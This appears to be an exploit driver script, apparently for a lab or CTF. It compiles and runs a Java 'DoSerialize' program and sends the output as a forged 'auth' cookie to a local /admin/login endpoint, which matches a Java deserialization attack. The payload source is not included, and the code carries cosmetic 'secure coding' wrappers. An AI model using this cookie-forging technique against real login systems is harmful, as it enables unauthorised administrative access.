import requests
import subprocess
import bleach
import logging

# Configure secure logging
logging.basicConfig(
    filename='application.log',
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('exploit_script')

def console(cmd_args):
    """Execute a command securely with arguments as a list"""
    try:
        # Use subprocess.run instead of Popen and avoid shell=True
        process = subprocess.run(
            cmd_args,
            capture_output=True,
            text=True,
            check=False
        )
        # Log sanitized command for audit purposes
        logger.info(f"Executed command: {bleach.clean(' '.join(cmd_args))}")
        return (process.returncode, process.stdout, process.stderr)
    except Exception as e:
        # Log sanitized error message
        logger.error(f"Command execution error: {bleach.clean(str(e))}")
        return (1, "", str(e))

# Execute commands with proper argument lists
console(["javac", "DoSerialize.java"])
cookieval = console(["java", "DoSerialize"])

# Sanitize any data that might be logged
cookie = {'auth': bleach.clean(cookieval[1].strip())}

# Make HTTP request
r = requests.post(
    'http://localhost:8081/admin/login', 
    cookies=cookie, 
    data=" ",
    allow_redirects=True
)

# Sanitize response before logging or printing
sanitized_response = bleach.clean(r.text)
logger.info(f"Response received: {sanitized_response}")
print(sanitized_response)

